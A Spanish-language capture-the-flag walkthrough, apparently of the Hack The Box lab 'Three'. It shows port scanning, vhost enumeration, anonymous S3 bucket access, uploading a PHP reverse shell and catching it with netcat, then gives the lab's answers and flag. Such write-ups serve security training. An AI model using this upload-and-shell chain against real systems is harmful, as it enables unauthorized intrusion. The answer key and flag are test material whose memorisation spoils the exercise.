# Three

### 1. 📝 **Introducción**

* **Nivel de Dificultad**: Muy fácil.
* **Tags:**&#x20;
  * **Cloud**: Entorno de computación basado en servidores remotos.
  * **Custom Applications**: Aplicaciones desarrolladas para necesidades específicas.
  * **AWS**: Plataforma de servicios en la nube de Amazon.
  * **Reconnaissance**: Fase de recopilación de información en pruebas de seguridad.
  * **Web Site Structure Discovery**: Técnica para identificar la estructura de un sitio web.
  * **Bucket Enumeration**: Proceso de identificar y listar buckets en almacenamiento en la nube.
  * **Arbitrary File Upload**: Vulnerabilidad que permite la carga de archivos no autorizados.
  * **Anonymous/Guest Access**: Acceso sin autenticación a recursos o servicios.

### 2. 🛠️ **Entorno**

Nos descargamos nuestra VPN y nos conectamos.

```
sudo openvpn nombre_del_archivo.vpn
```

Iniciamos la máquina y verificamos la conexión.

```bash
ping -c 1 10.129.126.143
```

<figure><img src="../../../.gitbook/assets/image (32) (1).png" alt=""><figcaption></figcaption></figure>

Observamos que tenemos conexión y que es una máquina **Linux** ya que su **ttl=63**.

### 3. 🔍 **Reconocimiento**

A continuación, se realiza el comando:

```bash
nmap -p- --min-rate 5000 -sV 10.129.126.143
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../../.gitbook/assets/image (33) (1).png" alt=""><figcaption></figcaption></figure>

### 4. 🚪 **Acceso Inicial**

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2024-09-01 201005.png" alt=""><figcaption></figcaption></figure>

Hicimos algunas pruebas en el sitio web y anotamos la dirección de correo electrónico que aparece en la sección de contacto: `mail@thetoppers.htb`.

Para facilitar el proceso, añadimos la siguiente entrada al archivo `/etc/hosts` en nuestro equipo:

```
10.129.126.143  thetoppers.htb
```

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Dentro de un dominio, es posible tener varios subdominios para organizar diferentes funcionalidades web sin necesidad de configurar un servidor por cada servicio. El próximo paso es identificar subdominios válidos. Para ello, utilizaremos un ataque de diccionario con la herramienta **Gobuster**.

```bash
gobuster vhost -u http://thetoppers.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Vamos a añadir la dirección del subdominio `s3.thetoppers.htb` al archivo `/etc/hosts` utilizando un comando sencillo.

<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

Después de investigar en Internet, parece que el servicio se refiere a **Amazon Simple Storage Service (Amazon S3)**. En esencia, Amazon S3 es un servicio de almacenamiento en la nube que permite guardar datos en contenedores llamados **"buckets"**. Este servicio puede usarse para guardar diversos tipos de información, como copias de seguridad, archivos multimedia, páginas web estáticas, entre otros.

```
sudo apt install awscli
```

Debemos configurarlo de una forma básica por si cuela.

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

```bash
aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb
```

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

Esto nos muestra dos elementos de interés y una carpeta llamada **"images"**. Además, disponemos de un servicio que nos permite descargar estos archivos de forma remota a nuestro entorno.

Si no hay una configuración que exija autorización para subir archivos, podemos intentar cargar una Reverse Shell. Sabemos que el servidor está ejecutando archivos con extensión PHP, por lo que ya sabemos cómo generar una. Para este propósito, suelo recurrir a la Reverse Shell en PHP disponible en **pentestmonkey**. Puedes encontrar el script [aquí](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

Extraemos solo el contenido del payload y lo ajustamos para que funcione correctamente.

Luego, utilizamos el siguiente comando para subir un archivo desde nuestro sistema local al servicio remoto.

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

Como podemos ver, hemos logrado subir archivos sin autorización al bucket del servicio web que opera en el puerto 80. Por lo tanto, si accedemos a ese archivo mientras tenemos Netcat escuchando en el puerto especificado (443), deberíamos obtener una shell.

Primero, nos ponemos a la escucha:

```bash
nc -nlvp 443
```

Luego, accedemos a `http://thetoppers.htb/shell.php`.

<figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

### 5. 🔑 **Captura de la Flag**

Una vez dentro investigamos distintos directorios para ver donde se encuentra la flag. La flag se encontraba en el directorio `/var/www/flag.txt`.

<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

### 6. ❓Preguntas

#### Tarea 1: ¿Cuántos puertos TCP están abiertos?

**2**

_Durante un escaneo de puertos, se detectaron dos puertos TCP abiertos en el servidor._

#### Tarea 2: ¿Cuál es el dominio de la dirección de correo electrónico proporcionada en la sección "Contact" del sitio web?

**thetoppers.htb**

_En la sección de contacto de la página web, se proporciona una dirección de correo electrónico asociada al dominio `thetoppers.htb`._

#### Tarea 3:  En ausencia de un servidor DNS, ¿qué archivo de Linux podemos usar para resolver nombres de host a direcciones IP para poder acceder a los sitios web que apuntan a esos nombres de host?

**/etc/hosts**

_El archivo `/etc/hosts` en Linux se utiliza para mapear nombres de host a direcciones IP de manera manual._

#### Tarea 4: ¿Qué subdominio se descubre durante una enumeración adicional?

**s3.thetoppers.htb**

_A través de la enumeración, que es el proceso de identificar y explorar todos los subdominios y servicios relacionados con un dominio principal, se descubrió el subdominio `s3.thetoppers.htb`._

#### Tarea 5: ¿Qué servicio se está ejecutando en el subdominio descubierto?

**Amazon S3**

_Amazon S3 (Simple Storage Service) es un servicio de almacenamiento en la nube que permite almacenar y recuperar cualquier cantidad de datos en cualquier momento._

#### Tarea 6: ¿Qué utilidad de línea de comandos se puede usar para interactuar con el servicio que se ejecuta en el subdominio descubierto?

**awscli**

_`awscli` es una herramienta de línea de comandos que permite a los usuarios interactuar con los servicios de Amazon Web Services (AWS), incluidos S3, EC2, y más. Con `awscli`, los usuarios pueden realizar acciones como listar archivos, subir y descargar datos, y configurar permisos, todo desde la terminal._

#### Tarea 7: ¿Qué comando se utiliza para configurar la instalación de AWS CLI?

**aws configure**

_El comando `aws configure` se utiliza para configurar las credenciales necesarias para interactuar con los servicios de AWS a través de `awscli`._

#### Tarea 8: ¿Cuál es el comando utilizado por la utilidad mencionada para listar todos los buckets S3?

**aws s3 ls**

_El comando `aws s3 ls` se usa para listar todos los buckets S3 asociados con las credenciales configuradas en `awscli`._

#### Tarea 9: Este servidor está configurado para ejecutar archivos escritos en qué lenguaje de scripting web?

**php**

_El servidor web está configurado para ejecutar archivos en PHP, un lenguaje de scripting ampliamente utilizado para el desarrollo de aplicaciones web dinámicas._

#### Tarea 10: Enviar Flag

a980d99281a28d638ac68b9bf9453c2b

<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

